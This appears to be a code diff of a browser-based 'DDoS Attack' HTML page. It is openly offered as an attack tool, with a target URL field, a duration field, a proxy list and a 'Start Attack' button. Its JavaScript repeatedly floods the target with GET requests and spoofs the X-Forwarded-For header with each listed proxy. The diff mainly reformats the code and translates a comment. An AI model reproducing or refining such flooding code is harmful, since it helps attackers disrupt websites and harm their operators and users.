@@ -1,78 +1,81 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>DDoS Attack</title>
-    <script>
-        var attackCount = 0;
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>DDoS Attack</title>
+<script>
+    var attackCount = 0;
 
-        function updateOutput(message) {
-            var output = document.getElementById("output");
-            output.innerHTML += message + "<br>";
-        }
+    function updateOutput(message) {
+        var output = document.getElementById("output");
+        output.innerHTML += '<span style="color: green;">' + message + '</span><br>';
+    }
 
-        function sendAttackRequest(targetUrl, proxy) {
-            return new Promise(function(resolve, reject) {
-                var xhr = new XMLHttpRequest();
-                xhr.open("GET", targetUrl);
-                xhr.setRequestHeader("X-Forwarded-For", proxy);
-                xhr.onload = function() {
-                    if (xhr.status >= 200 && xhr.status < 300) {
-                        resolve(xhr.responseText);
-                    } else {
-                        reject(xhr.statusText);
-                    }
-                };
-                xhr.onerror = function() {
+    function sendAttackRequest(targetUrl, proxy) {
+        return new Promise(function(resolve, reject) {
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", targetUrl);
+            xhr.setRequestHeader("X-Forwarded-For", proxy);
+            xhr.onload = function() {
+                if (xhr.status >= 200 && xhr.status < 300) {
+                    resolve(xhr.responseText);
+                } else {
                     reject(xhr.statusText);
-                };
-                xhr.send();
-            });
-        }
-
-        function performAttack(duration, targetUrl, proxies) {
-            attackCount++;
-            updateOutput("Attack #" + attackCount);
-            
-            var promises = [];
-            
-            for (var i = 0; i < proxies.length; i++) {
-                // เรียกใช้ proxy แต่ละตัวในการส่งคำขอโจมตี
-                promises.push(sendAttackRequest(targetUrl, proxies[i]));
-            }
-            
-            Promise.all(promises).then(function() {
-                if (attackCount * proxies.length >= duration) {
-                    updateOutput("Attack finished.");
-                    return;
                 }
-                setTimeout(function() {
-                    performAttack(duration, targetUrl, proxies);
-                }, 1000);
-            });
+            };
+            xhr.onerror = function() {
+                reject(xhr.statusText);
+            };
+            xhr.send();
+        });
+    }
+
+    function performAttack(duration, targetUrl, proxies) {
+        attackCount++;
+        updateOutput("Attack #" + attackCount);
+
+        var promises = [];
+        for (var i = 0; i < proxies.length; i++) {
+            // Use each proxy to send attack requests
+            promises.push(sendAttackRequest(targetUrl, proxies[i]));
         }
 
-        function startAttack() {
-            var targetUrl = document.getElementById("targetUrl").value;
-            var duration = parseInt(document.getElementById("duration").value);
-            var proxyString = document.getElementById("proxy").value;
-            var proxies = proxyString.split("\n");
-            performAttack(duration, targetUrl, proxies);
-        }
-    </script>
+        Promise.all(promises).then(function() {
+            if (attackCount * proxies.length >= duration) {
+                updateOutput("Attack finished.");
+                return;
+            }
+            setTimeout(function() {
+                performAttack(duration, targetUrl, proxies);
+            }, 1000);
+        });
+    }
+
+    function startAttack() {
+        var targetUrl = document.getElementById("targetUrl").value;
+        var duration = parseInt(document.getElementById("duration").value);
+        var proxyString = document.getElementById("proxy").value;
+        var proxies = proxyString.split("\n");
+        performAttack(duration, targetUrl, proxies);
+    }
+</script>
 </head>
 <body>
-    <h1>DDoS Attack</h1>
-    <label for="targetUrl">Target URL:</label><br>
-    <input type="text" id="targetUrl" value="https://example.com"><br><br>
-    <label for="duration">Attack Duration (seconds):</label><br>
-    <input type="number" id="duration" value="60"><br><br>
-    <label for="proxy">Proxies (one per line):</label><br>
-    <textarea id="proxy" rows="5">Proxy1:Port1
+<h1>DDoS Attack</h1>
+<label for="targetUrl">Target URL:</label><br>
+<input type="text" id="targetUrl" value="https://example.com"><br><br>
+
+<label for="duration">Attack Duration (seconds):</label><br>
+<input type="number" id="duration" value="60"><br><br>
+
+<label for="proxy">Proxies (one per line):</label><br>
+<textarea id="proxy" rows="5">Proxy1:Port1
 Proxy2:Port2
 Proxy3:Port3</textarea><br><br>
-    <button onclick="startAttack()">Start Attack</button><br><br>
-    <div id="output"></div>
+
+<button onclick="startAttack()">Start Attack</button><br><br>
+
+<div id="output"></div>
 </body>
 </html>
